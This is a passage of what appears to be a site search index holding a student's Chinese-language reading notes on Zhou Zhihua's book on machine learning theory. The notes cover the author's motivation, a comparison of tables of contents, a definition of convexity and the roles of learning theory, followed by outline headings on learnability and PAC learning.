\u7684\u4e66\u76f8\u6bd4\uff0c\u524d\u8005\u662f\u9053\uff0c\u540e\u8005\u662f\u5668\uff0c\u90a3\u4e48\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u53ef\u80fd\u5c31\u662f\u9053\u4e4b\u9053\uff0c\u7528\u6765\u7814\u7a76\u673a\u5668\u5b66\u4e60\u7406\u8bba\u7684\u7406\u8bba\u3002 3. \u7b2c\u4e00\u7ae0 \u9884\u5907\u77e5\u8bc6 # \u8001\u5e08\u5728\u8fd9\u4e00\u7ae0\u8bb2\u89e3\u4e86\u4e00\u4e9b\u672c\u4e66\u7684\u9884\u5907\u77e5\u8bc6\uff0c\u6709\u51fd\u6570\u7684\u6027\u8d28\u3001\u91cd\u8981\u4e0d\u7b49\u5f0f\u3001\u6700\u4f18\u5316\u57fa\u7840\u3001\u652f\u6301\u5411\u91cf\u673a\u3001\u7406\u8bba\u7684\u4f5c\u7528\u7b49\u5185\u5bb9\u3002 \u6211\u60f3\u8981\u5148\u770b\u540e\u9762\u7684\u5185\u5bb9\uff0c\u5728\u9700\u8981\u7684\u65f6\u5019\u518d\u7ffb\u9605\u7b2c\u4e00\u7ae0\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u5217\u4e3e\u4e24\u4e2a\u6211\u4eec\u9700\u8981\u77e5\u9053\u7684\u77e5\u8bc6\u70b9\u3002 3.1. \u51fd\u6570\u7684\u51f9\u51f8\u6027 # \u5b9a\u4e49 \u8bbe\u51fd\u6570 f(x) \u5728\u533a\u95f4 I \u4e0a\u8fde\u7eed\uff0c\u5982\u679c\u5bf9 I \u4e0a\u4efb\u610f\u4e24\u70b9 x_1, x_2 \uff0c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) < \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u4e3a\u51f8\u51fd\u6570\u3002\u5982\u679c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) \\ge \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u662f\u51f9\u51fd\u6570\u3002 \u5178\u578b\u7684\u51f8\u51fd\u6570\u6709 f(x) = \\frac{1}{2}x^2 \uff0c\u5178\u578b\u7684\u51f9\u51fd\u6570\u6709 f(x) = - \\frac{1}{2}x^2 \u3002 \u9700\u8981\u8bf4\u660e\u7684\u662f\uff0c\u8fd9\u4e2a\u5b9a\u4e49\u4e0e\u56fd\u9645\u901a\u884c\u7684\u5b9a\u4e49\u4e00\u81f4\uff0c\u4f46\u548c\u6211\u4eec\u7684\u9ad8\u6570\u8bfe\u672c\u662f\u76f8\u53cd\u7684\u3002 3.2. \u5b66\u4e60\u7406\u8bba\u7684\u4f5c\u7528 # \u9996\u5148\uff0c\u5b66\u4e60\u7406\u8bba\u80fd\u544a\u8bc9\u6211\u4eec\uff1a\u67d0\u4ef6\u4e8b\u80fd\u505a\u5417\uff1f \u5b66\u4e60\u7406\u8bba\u53ef\u4ee5\u544a\u8bc9\u6211\u4eec\uff1a\u4ec0\u4e48\u56e0\u7d20\u91cd\u8981\uff1f \u5b66\u4e60\u7406\u8bba\u53ef\u4ee5\u544a\u8bc9\u6211\u4eec\uff1a\u80fd\u5426\u505a\u5f97\u66f4\u597d\uff1f \u6ce8\uff1a\u6b64\u5904\u7684 \u5b66\u4e60\u7406\u8bba \u6307 \u673a\u5668\u5b66\u4e60\u7406\u8bba \u3002 \u6211\u8ba4\u4e3a\u672c\u4e66\u540e\u9762\u7684\u5185\u5bb9\u57fa\u672c\u4e0a\u5c31\u662f\u56f4\u7ed5\u8fd9\u6837\u7684\u4e09\u4e2a\u95ee\u9898\u5c55\u5f00\u3002 \u7b2c 2-3 \u7ae0\u56de\u7b54\u7684\u662f\u80fd\u4e0d\u80fd\u505a\u7684\u95ee\u9898 \u7b2c 4-5 \u7ae0\u56de\u7b54\u7684\u662f\u4ec0\u4e48\u56e0\u7d20\u91cd\u8981\u7684\u95ee\u9898\u3002 \u7b2c 6-8 \u7ae0\u56de\u7b54\u7684\u662f\u80fd\u5426\u505a\u5f97\u66f4\u597d\u7684\u95ee\u9898\u3002 4. \u53ef\u5b66\u6027 # 4.1. \u57fa\u672c\u6982\u5ff5 # 4.1.1. \u72ec\u7acb\u540c\u5206\u5e03 # \u72ec\u7acb\u540c\u5206\u5e03\uff08iid\uff0cindependently identically distribution\uff09 \u5728\u6982\u7387\u7edf\u8ba1\u7406\u8bba\u4e2d\uff0c\u6307\u968f\u673a\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u4f55\u65f6\u523b\u7684\u53d6\u503c\u90fd\u4e3a\u968f\u673a\u53d8\u91cf\uff0c\u5982\u679c\u8fd9\u4e9b\u968f\u673a\u53d8\u91cf\u670d\u4ece\u540c\u4e00\u5206\u5e03\uff0c\u5e76\u4e14\u4e92\u76f8\u72ec\u7acb\uff0c\u90a3\u4e48\u8fd9\u4e9b\u968f\u673a\u53d8\u91cf\u662f\u72ec\u7acb\u540c\u5206\u5e03\u3002 4.1.2. \u6cdb\u5316\u8bef\u5dee # 4.1.3. \u7ecf\u9a8c\u8bef\u5dee # 4.1.4. \u8bef\u5dee\u53c2\u6570 # 4.1.5. \u4e0d\u5408 # 4.1.6. \u6982\u5ff5\u4e0e\u6982\u5ff5\u7c7b # 4.1.7. \u5047\u8bbe\u7a7a\u95f4 # 4.1.8. \u53ef\u5206\u4e0e\u4e0d\u53ef\u5206 # 4.2. PAC\u5b66\u4e60 # 4.3. \u5206\u6790\u5b9e\u4f8b # \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#_1","text":"","title":"\u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#_2","text":"\u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 3. \u7b2c\u4e00\u7ae0 \u9884\u5907\u77e5\u8bc6 3.1. \u51fd\u6570\u7684\u51f9\u51f8\u6027 3.2. \u5b66\u4e60\u7406\u8bba\u7684\u4f5c\u7528 4. \u53ef\u5b66\u6027 4.1. \u57fa\u672c\u6982\u5ff5 4.1.1. \u72ec\u7acb\u540c\u5206\u5e03 4.1.2. \u6cdb\u5316\u8bef\u5dee 4.1.3. \u7ecf\u9a8c\u8bef\u5dee 4.1.4. \u8bef\u5dee\u53c2\u6570 4.1.5. \u4e0d\u5408 4.1.6. \u6982\u5ff5\u4e0e\u6982\u5ff5\u7c7b 4.1.7. \u5047\u8bbe\u7a7a\u95f4 4.1.8. \u53ef\u5206\u4e0e\u4e0d\u53ef\u5206 4.2. PAC\u5b66\u4e60 4.3. \u5206\u6790\u5b9e\u4f8b","title":"\u76ee\u5f55"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#1","text":"\u6700\u8fd1\u770b\u5230\u4e86\u5468\u5fd7\u534e\u8001\u5e08\u51fa\u4e86\u65b0\u4e66\u300a\u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15\u300b\uff0c\u6211\u62b1\u7740\u4e0d\u80fd\u9519\u8fc7\u7684\u5fc3\u6001\u4e70\u6765\u770b\u4e86\u4e00\u770b\uff0c\u53d1\u73b0\u65b0\u4e66\u4e0e\u4ee5\u524d\u770b\u8fc7\u7684\u673a\u5668\u5b66\u4e60\u65b9\u9762\u7684\u4e66\u6240\u8bb2\u8ff0\u7684\u5185\u5bb9\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u4e8e\u662f\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u8bb0\u5f55\u4e00\u4e0b\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#2","text":"\u8fd9\u662f\u4e00\u672c\u8ba9\u4eba\u81ea\u7701\u5e76\u4e14\u53d1\u73b0\u81ea\u5df1\u7684\u65e0\u77e5\u7684\u4e66\u3002 \u6211\u5927\u6982\u662f\u4e00\u5e74\u524d\u5f00\u59cb\u4e86\u89e3\u673a\u5668\u5b66\u4e60\u7684\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2a \u4e0d\u5b66AI\uff0c\u65e0\u4ee5\u8a00 \u7684\u65f6\u5019\u3002\u5468\u5fd7\u534e\u8001\u5e08\u7684\u300a \u673a\u5668\u5b66\u4e60 \u300b\uff0c\u674e\u822a\u8001\u5e08\u7684\u300a \u7edf\u8ba1\u5b66\u4e60\u65b9\u6cd5 \u300b\uff0c\u62ff\u5728\u624b\u4e0a\u597d\u50cf\u8d70\u8def\u5e26\u98ce\uff0c\u6709\u4e86\u8fd9\u4e24\u672c\u4e66\uff0c\u597d\u50cf\u5c31\u628a\u81ea\u5df1\u548c\u7199\u7199\u6518\u6518\u7684\u4eba\u7fa4\u533a\u5206\u4e86\u5f00\u6765\uff0c\u6211\u4eec\u662f \u77e5\u9053AI\u7684\u4eba \uff0c\u4ed6\u4eec\u662f \u4e0d\u77e5\u9053AI\u7684\u4eba \u3002 \u6211\u5728\u6dd8\u5b9d\u641c\u4e86\u4e00\u4e0b\uff0c\u300a \u6df1\u5ea6\u5b66\u4e60 \u300b\u6ca1\u6709\u4e0a\u9762\u4e24\u672c\u4e66\u5356\u5f97\u597d\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u4e3b\u8981\u662f\u592a\u91cd\u4e86\u4e0d\u597d\u5e26\u7740\u51fa\u95e8\u3002 \u521a\u5f00\u59cb\u5b66\u7684\u65f6\u5019\uff0c sklearn \u4e00\u8c03\uff0c\u4e24\u624b\u4e00\u53c9\uff0c\u518d\u559d\u53e3\u8336\uff0c\u770b\u7740\u5c4f\u5e55\u4e0a\u8f93\u51fa\u7684 loss \u9010\u6e10\u964d\u4f4e\uff0c\u611f\u89c9\u81ea\u5df1\u5c31\u662f AI \u7684 Master \u3002 \u540e\u6765\u9646\u9646\u7eed\u7eed\u770b\u4e86\u4e00\u70b9 CV \u3001 NLP \u3001 GAN \u3001 \u77e5\u8bc6\u56fe\u8c31 \uff0c\u867d\u7136\u516c\u5f0f\u5f88\u591a\u770b\u4e0d\u61c2\uff0c\u4f46\u8bb8\u591a\u65f6\u5019\u4e5f\u5c31\u662f\u8fd9\u6837\u7684 \u7f51\u7edc \u548c\u90a3\u6837\u7684 \u5377\u79ef \u7684\u4e00\u4e9b\u7ec4\u5408\u3002\u518d\u52a0\u4e0a\u53ef\u4ee5 import tensorflow as tf \uff0c from torch import nn \uff0c import mxnet as mx \uff0c\u54ea\u91cc\u4e0d\u4f1a\u70b9\u54ea\u91cc\uff0c\u60f3\u8981\u4ec0\u4e48\u7f51\u7edc\u90fd\u6709\u73b0\u6210\u7684\u3002 \u4e8e\u662f\uff0c AI \u5de5\u5177\u7684\u4f4e\u4f7f\u7528\u95e8\u69db\u548c AI \u5c97\u4f4d\u7684\u9ad8\u6536\u76ca\u5f62\u6210\u4e86\u9c9c\u660e\u7684\u5bf9\u6bd4\uff0c\u8fd9\u5c31\u662f\u91d1\u878d\u754c\u82e6\u82e6\u8ffd\u5bfb\u7684 \u65e0\u98ce\u9669\u5957\u5229 \u554a\u3002\u4e00\u65f6\u95f4\u641e\u751f\u7269\u7684\u3001\u641e\u673a\u68b0\u7684\u3001\u641e\u901a\u8baf\u7684\u90fd\u5f00\u59cb\u5b66\u8d77\u4e86 AI \uff0c\u5176\u4e2d\u5f53\u7136\u5c11\u4e0d\u4e86\u6211\u4eec\u641e\u8ba1\u7b97\u673a\u7684\uff0c\u5b57\u8282\u8df3\u52a8\u751a\u81f3\u56e0\u4e3a \u6536\u5230\u7684\u7b97\u6cd5\u5de5\u7a0b\u5e08\u7b80\u5386\u7684\u6570\u91cf\u8fdc\u8d85\u9700\u6c42 \uff0c\u7ed9\u6c42\u804c\u8005\u53d1\u90ae\u4ef6\u5efa\u8bae\u5927\u5bb6\u8f6c\u6295\u5f00\u53d1\u5c97\u4f4d\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u4e5f\u5b66\u4f1a\u4e86\u4e00\u4e2a\u540d\u8bcd\u53eb \u4eba\u624d\u5185\u5377 \u3002 \u8d28\u7591\u7684\u58f0\u97f3\u4e5f\u603b\u4f1a\u6709\u7684\uff0c\u4e00\u4e2a\u8dd1\u51fa\u6765\u7684\u7ed3\u679c\u597d\uff0c\u4f46\u662f\u4f60\u6839\u672c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u597d\u7684\u6a21\u578b\uff0c\u771f\u7684\u4f1a\u6709\u4e0d\u9519\u7684\u5e94\u7528\u524d\u666f\u5417\uff1f \u5728\u8fd9\u6837\u7684\u73af\u5883\u4e0b\uff0c\u6f5c\u5fc3\u641e\u7406\u8bba\u7814\u7a76\u7684\u4eba\u5c11\uff0c\u8d76\u7d27\u8c03\u4e2a\u53c2\u53d1\u4e24\u7bc7\u8bba\u6587\u7684\u4eba\u591a\u3002 \u6211\u5b66\u5f97\u4e5f\u5f88\u6d6e\u8e81\uff0c\u56e0\u4e3a\u522b\u4eba\u5728\u5ba3\u626c AI \u4f1a\u63a8\u7ffb\u4eba\u7c7b\u5bf9\u4e16\u754c\u7684\u7edf\u6cbb\u7684\u65f6\u5019\uff0c\u6211\u9ed8\u9ed8\u5730\u770b\u4e86\u4e00\u773c\u5c4f\u5e55\u4e2d\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u4f4e\u4e0b\u4e86\u81ea\u5df1\u7684\u5934\u3002 \u4ece\u4eac\u4e1c\u5c0f\u54e5\u624b\u91cc\u62ff\u8fc7\u4e66\u7684\u65f6\u5019\uff0c\u6211\u6382\u91cf\u4e86\u4e00\u4e0b\uff0c\u4e0d\u91cd\uff0c\u9002\u5408\u5e26\u51fa\u95e8\u3002\u62c6\u6389\u5916\u5305\u88c5\u4e4b\u540e\uff0c\u53d1\u73b0\u9875\u9762\u6709\u4e00\u70b9\u8936\u76b1\uff0c\u4e0d\u8981\u7d27\uff0c\u518d\u8fc7\u4e00\u5e74\u53ef\u80fd\u5c31\u770b\u8d77\u6765\u8ddf\u65b0\u4e70\u7684\u4e00\u6837\u4e86\u3002 \u770b\u4e66\u5148\u770b\u76ee\u5f55\uff0c\u53ef\u662f\u4e00\u770b\u76ee\u5f55\u6211\u5c31\u50bb\u4e86\uff0c\u9884\u60f3\u4e4b\u4e2d\u7684\u719f\u6089\u611f\u6ca1\u6709\u5230\u6765\uff0c\u5f88\u591a\u4e1c\u897f\u89c1\u90fd\u6ca1\u89c1\u8fc7\u3002 \u6211\u4eec\u6765\u770b\u770b\u300a \u673a\u5668\u5b66\u4e60 \u300b\u7684\u76ee\u5f55\u3002 \u251c\u2500\u2500 \u7b2c1\u7ae0 \u7eea\u8bba \u251c\u2500\u2500 \u7b2c2\u7ae0 \u6a21\u578b\u8bc4\u4f30\u4e0e\u9009\u62e9 \u251c\u2500\u2500 \u7b2c3\u7ae0 \u7ebf\u6027\u6a21\u578b \u251c\u2500\u2500 \u7b2c4\u7ae0 \u51b3\u7b56\u6811 \u251c\u2500\u2500 \u7b2c5\u7ae0 \u795e\u7ecf\u7f51\u7edc \u251c\u2500\u2500 \u7b2c6\u7ae0 \u652f\u6301\u5411\u91cf\u673a \u2514\u2500\u2500 ... \u662f\u4e0d\u662f\u89c9\u5f97\u90fd\u6bd4\u8f83\u719f\u6089\uff0c\u8d77\u7801\u6709\u4e2a\u5927\u6982\u7684 idea \uff0c\u77e5\u9053\u8fd9\u4e9b\u662f\u4ec0\u4e48\u4e1c\u897f\u3002 \u518d\u6765\u770b\u770b\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u7684\u76ee\u5f55\u3002 \u251c\u2500\u2500 \u7b2c1\u7ae0 \u9884\u5907\u77e5\u8bc6 \u251c\u2500\u2500 \u7b2c2\u7ae0 \u53ef\u5b66\u6027 \u251c\u2500\u2500 \u7b2c3\u7ae0 \u590d\u6742\u5ea6 \u251c\u2500\u2500 \u7b2c4\u7ae0 \u6cdb\u5316\u754c \u251c\u2500\u2500 \u7b2c5\u7ae0 \u7a33\u5b9a\u6027 \u251c\u2500\u2500 \u7b2c6\u7ae0 \u4e00\u81f4\u6027 \u251c\u2500\u2500 \u7b2c7\u7ae0 \u6536\u655b\u7387 \u2514\u2500\u2500 \u7b2c8\u7ae0 \u9057\u61be\u754c \u963fSir\uff0c\u8fd9\u4e9b\u90fd\u662f\u5565\u5440\u3002\u4ec0\u4e48\u662f PAC\u53ef\u5b66 \u3001 VC\u7ef4 \u3001 Natarajan\u7ef4 \u3001 \u7ebf\u6027\u8d85\u5e73\u9762 \u3001 \u5728\u7ebf\u5f3a\u51f8\u4f18\u5316 \uff1f \u6211\u518d\u7ffb\u5230\u5e8f\u8a00\u90e8\u5206\uff0c\u8001\u5e08\u4ece2017\u5e74\u5f00\u59cb\u8bd5\u8bb2\u672c\u4e66\uff0c\u671f\u95f4\u591a\u6b21\u8c03\u6574\u5185\u5bb9\uff0c\u57282018\u5e74\u7ed9\u5357\u4eac\u5927\u5b66\u7814\u7a76\u751f\u8bb2\u5b8c\u4e00\u8f6e\u540e\uff0c\u6709 1/3 \u7684\u5b66\u751f\u611f\u89c9\u96be\u5ea6\u8f83\u5927\u3002\u518d\u6b21\u8c03\u6574\u5185\u5bb9\u540e\uff0c\u57282019\u5e74\u6625\u5b63\u53c8\u8bb2\u6388\u4e00\u8f6e\uff0c\u5b66\u751f\u53cd\u9988\u60c5\u51b5\u5927\u81f4\u7b26\u5408\u9884\u671f\u3002 \u6211\u4eec\u53ef\u4ee5\u518d\u62ff\u5468\u5fd7\u534e\u8001\u5e08\u4e4b\u524d\u7684\u4f5c\u54c1\u6765\u8fdb\u884c\u5bf9\u6bd4\u3002\u5728\u300a\u673a\u5668\u5b66\u4e60\u300b\u4e00\u4e66\u4e2d\uff0c\u5468\u5fd7\u534e\u8001\u5e08\u63d0\u5230\u8fd9\u662f\u4e00\u672c \u9762\u5411\u7406\u5de5\u79d1\u9ad8\u5e74\u7ea7\u672c\u79d1\u751f\u548c\u7814\u7a76\u751f\u7684\u6559\u79d1\u4e66 \uff0c\u5e76\u4e14\u7ed9\u51fa\u4e86\u5982\u679c\u4f5c\u4e3a\u672c\u79d1\u751f\u6559\u6750\uff0c\u8bb2\u6388\u8fdb\u5ea6\u4e0a\u7684\u4e00\u4e9b\u5efa\u8bae\u3002 \u800c\u5728\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u4e2d\uff0c\u8001\u5e08\u8bf4\uff0c\u672c\u4e66\u8bfb\u8005\u5fc5\u987b\u5177\u5907 \u8f83\u4e3a\u624e\u5b9e\u7684\u7406\u5de5\u79d1\u9ad8\u5e74\u7ea7\u672c\u79d1\u751f\u7684\u6570\u5b66\u77e5\u8bc6 \uff0c\u8fd8 \u5fc5\u987b\u5177\u5907\u673a\u5668\u5b66\u4e60\u7684\u57fa\u7840\u77e5\u8bc6 \uff0c\u81f3\u5c11\u5e94\u8be5\u7cfb\u7edf\u6027\u5730\u5b66\u4e60\u8fc7\u673a\u5668\u5b66\u4e60\u7684\u4e13\u95e8\u6027\u6559\u79d1\u4e66\u3002 \u7531\u6b64\u6211\u4eec\u5927\u6982\u53ef\u4ee5\u8ba4\u4e3a\uff0c\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u662f\u300a \u673a\u5668\u5b66\u4e60 \u300b\u4e00\u4e66\u7684\u540e\u7eed\u8fdb\u9636\u8bfb\u7269\uff0c\u6d89\u53ca\u7406\u8bba\u7814\u7a76\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u4e3b\u8981\u9762\u5411\u7684\u7fa4\u4f53\u5e94\u8be5\u8fd8\u662f\u7814\u7a76\u751f\u3002 \u5bf9\u4e8e\u6211\u8fd9\u4e2a\u521a\u63a5\u89e6\u673a\u5668\u5b66\u4e60\u4e00\u5e74\u7684\u666e\u901a\u672c\u79d1\u751f\u6765\u8bf4\uff0c\u91cc\u9762\u662f\u5168\u65b0\u7684\u5185\u5bb9\uff0c\u7c97\u770b\u4e0b\u6765\u66f4\u50cf\u662f\u4e00\u672c\u6570\u5b66\u548c\u7edf\u8ba1\u65b9\u9762\u7684\u4e66\uff0c\u540c\u65f6\u4e5f\u610f\u5473\u7740\u6211\u6709\u4e0d\u5c11\u7684\u6570\u5b66\u77e5\u8bc6\u9700\u8981\u8865\u5145\u3002 \u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u5728\u4e00\u5f00\u59cb\u8bf4\u5230\uff0c\u8fd9\u662f\u4e00\u672c\u8ba9\u4eba\u81ea\u7701\u5e76\u4e14\u53d1\u73b0\u81ea\u5df1\u7684\u65e0\u77e5\u7684\u4e66\u3002 \u6709\u4e86\u9ed1\u7bb1\u5de5\u5177\u7684\u652f\u6301\uff0c\u6211\u4eec\u7ad9\u5728\u5e94\u7528\u7684\u5c42\u9762\u4e0a\uff0c\u5f88\u5bb9\u6613\u89c9\u5f97\u673a\u5668\u5b66\u4e60\u4e0d\u8fc7\u5982\u6b64\uff0c\u4f46\u662f\u673a\u5668\u5b66\u4e60\u771f\u7684\u4e0d\u8fc7\u5982\u6b64\u5417\uff1f\u6709\u65f6\u5019\uff0c\u6211\u4eec\u4ea7\u751f \u4e0d\u8fc7\u5982\u6b64 \u7684\u611f\u89c9\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u7684\u4e1c\u897f\u592a\u5c11\u3002 \u6709\u4e00\u79cd\u8ba4\u77e5\u504f\u5dee\u53eb\u505a \u8fbe\u514b\u6548\u5e94\uff08D-K effect\uff09 \uff0c\u5168\u79f0\u4e3a \u9093\u5b81-\u514b\u9c81\u683c\u6548\u5e94\uff08Dunning-Kruger effect\uff09 \u3002\u80fd\u529b\u6b20\u7f3a\u8005\u4eec\u6c89\u6d78\u5728\u81ea\u6211\u8425\u9020\u7684\u865a\u5e7b\u7684\u4f18\u52bf\u4e4b\u4e2d\uff0c\u5e38\u5e38\u9ad8\u4f30\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\u3002 \u8fd9\u672c\u4e66\u4e5f\u8bb8\u5c31\u80fd\u8ba9\u4eba\u4ece\u611a\u6627\u5c71\u5cf0\u4e0a\u8d70\u4e0b\u6765\uff0c\u610f\u8bc6\u5230\u81ea\u5df1\u7684\u65e0\u77e5\u3002 \u5982\u679c\u8bf4\u300a \u673a\u5668\u5b66\u4e60 \u300b\u4e0e\u8bb2 TensorFlow \u7684\u4e66\u76f8\u6bd4\uff0c\u524d\u8005\u662f\u9053\uff0c\u540e\u8005\u662f\u5668\uff0c\u90a3\u4e48\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u53ef\u80fd\u5c31\u662f\u9053\u4e4b\u9053\uff0c\u7528\u6765\u7814\u7a76\u673a\u5668\u5b66\u4e60\u7406\u8bba\u7684\u7406\u8bba\u3002","title":"2. \u6982\u8ff0"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#3","text":"\u8001\u5e08\u5728\u8fd9\u4e00\u7ae0\u8bb2\u89e3\u4e86\u4e00\u4e9b\u672c\u4e66\u7684\u9884\u5907\u77e5\u8bc6\uff0c\u6709\u51fd\u6570\u7684\u6027\u8d28\u3001\u91cd\u8981\u4e0d\u7b49\u5f0f\u3001\u6700\u4f18\u5316\u57fa\u7840\u3001\u652f\u6301\u5411\u91cf\u673a\u3001\u7406\u8bba\u7684\u4f5c\u7528\u7b49\u5185\u5bb9\u3002 \u6211\u60f3\u8981\u5148\u770b\u540e\u9762\u7684\u5185\u5bb9\uff0c\u5728\u9700\u8981\u7684\u65f6\u5019\u518d\u7ffb\u9605\u7b2c\u4e00\u7ae0\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u5217\u4e3e\u4e24\u4e2a\u6211\u4eec\u9700\u8981\u77e5\u9053\u7684\u77e5\u8bc6\u70b9\u3002","title":"3. \u7b2c\u4e00\u7ae0 \u9884\u5907\u77e5\u8bc6"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#31","text":"\u5b9a\u4e49 \u8bbe\u51fd\u6570 f(x) \u5728\u533a\u95f4 I \u4e0a\u8fde\u7eed\uff0c\u5982\u679c\u5bf9 I \u4e0a\u4efb\u610f\u4e24\u70b9 x_1, x_2 \uff0c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) < \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u4e3a\u51f8\u51fd\u6570\u3002\u5982\u679c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) \\ge \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u662f\u51f9\u51fd\u6570\u3002 \u5178\u578b\u7684\u51f8\u51fd\u6570\u6709 f(x) = \\frac{1}{2}x^2 \uff0c\u5178\u578b\u7684\u51f9\u51fd\u6570\u6709 f(x) = - \\frac{1}{2}x^2 \u3002 \u9700\u8981\u8bf4\u660e\u7684\u662f\uff0c\u8fd9\u4e2a\u5b9a\u4e49\u4e0e\u56fd\u9645\u901a\u884c\u7684\u5b9a\u4e49\u4e00\u81f4\uff0c\u4f46\u548c\u6211\u4eec\u7684\u9ad8\u6570\u8bfe\u672c\u662f\u76f8\u53cd\u7684\u3002","title":"3.1. \u51fd\u6570\u7684\u51f9\u51f8\u6027"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#32","text":"\u9996\u5148\uff0c\u5b66\u4e60\u7406\u8bba\u80fd\u544a\u8bc9\u6211\u4eec\uff1a\u67d0\u4ef6\u4e8b\u80fd\u505a\u5417\uff1f \u5b66\u4e60\u7406\u8bba\u53ef\u4ee5\u544a\u8bc9\u6211\u4eec\uff1a\u4ec0\u4e48\u56e0\u7d20\u91cd\u8981\uff1f \u5b66\u4e60\u7406\u8bba\u53ef\u4ee5\u544a\u8bc9\u6211\u4eec\uff1a\u80fd\u5426\u505a\u5f97\u66f4\u597d\uff1f \u6ce8\uff1a\u6b64\u5904\u7684 \u5b66\u4e60\u7406\u8bba \u6307 \u673a\u5668\u5b66\u4e60\u7406\u8bba \u3002 \u6211\u8ba4\u4e3a\u672c\u4e66\u540e\u9762\u7684\u5185\u5bb9\u57fa\u672c\u4e0a\u5c31\u662f\u56f4\u7ed5\u8fd9\u6837\u7684\u4e09\u4e2a\u95ee\u9898\u5c55\u5f00\u3002 \u7b2c 2-3 \u7ae0\u56de\u7b54\u7684\u662f\u80fd\u4e0d\u80fd\u505a\u7684\u95ee\u9898 \u7b2c 4-5 \u7ae0\u56de\u7b54\u7684\u662f\u4ec0\u4e48\u56e0\u7d20\u91cd\u8981\u7684\u95ee\u9898\u3002 \u7b2c 6-8 \u7ae0\u56de\u7b54\u7684\u662f\u80fd\u5426\u505a\u5f97\u66f4\u597d\u7684\u95ee\u9898\u3002","title":"3.2. \u5b66\u4e60\u7406\u8bba\u7684\u4f5c\u7528"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/#4","text":"","title":"4. 